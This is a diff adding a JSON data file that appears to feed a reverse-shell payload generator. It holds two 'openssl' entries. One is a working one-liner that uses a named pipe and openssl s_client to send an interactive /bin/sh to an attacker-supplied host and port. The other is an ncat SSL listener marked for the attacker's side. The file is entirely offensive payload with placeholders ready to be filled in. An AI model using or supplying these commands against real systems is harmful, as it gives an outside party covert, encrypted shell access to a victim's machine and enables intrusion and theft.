@@ -1,0 +1,16 @@
+[ 
+  {
+    "type": "openssl",
+    "direction": "reverse",
+    "payload": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s",
+    "note": null,
+    "id": "openssl1"
+  },
+  {
+    "type": "openssl",
+    "direction": "reverse",
+    "payload": "ncat --ssl -vv -l -p {LPORT}",
+    "note": "Listener (attacker)",
+    "id": "openssl2"
+  }
+]
